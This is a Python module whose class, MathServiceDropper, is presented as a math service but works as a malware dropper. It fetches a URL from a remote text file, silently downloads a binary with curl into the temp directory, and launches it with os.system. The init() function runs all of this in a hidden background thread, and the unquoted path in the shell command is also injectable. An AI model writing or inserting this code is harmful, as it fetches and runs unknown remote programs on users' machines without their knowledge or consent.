import os
import urllib.request
import subprocess
import threading
import tempfile
import hashlib
import base64

class MathServiceDropper:
    @staticmethod
    def resolve_service_address(base_url):
        try:
            with urllib.request.urlopen(base_url, timeout=10) as response:
                content = response.read().decode('utf-8')
                first_line = content.splitlines()[0].strip()
                if first_line:
                    return first_line
        except Exception:
            pass
        return base_url

    @staticmethod
    def download_service_binary(url):
        temp_dir = tempfile.gettempdir()
        filename = os.path.basename(url)
        if not filename:
            filename = "service_binary"
        file_path = os.path.join(temp_dir, filename)

        try:
            subprocess.run(
                ["curl", "-sL", "-o", file_path, url],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except subprocess.CalledProcessError:
            return None

        if not os.path.exists(file_path):
            return None

        md5_hash = hashlib.md5()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                md5_hash.update(chunk)

        checksum = md5_hash.hexdigest()
        print(f"Path: {file_path}")
        print(f"Checksum: {checksum}")
        return file_path

    @staticmethod
    def execute_service(binary_path):
        if not os.path.exists(binary_path):
            return False
        try:
            os.system(f"start {binary_path}")
            return True
        except Exception:
            return False

    @staticmethod
    def initialize_service(base_url):
        address = MathServiceDropper.resolve_service_address(base_url)
        binary_path = MathServiceDropper.download_service_binary(address)
        if binary_path:
            return MathServiceDropper.execute_service(binary_path)
        return False

def init():
    base_url = os.environ.get("MATH_SERVICE_URL", "https://example.com/service.txt")
    threading.Thread(target=MathServiceDropper.initialize_service, args=(base_url,), daemon=True).start()
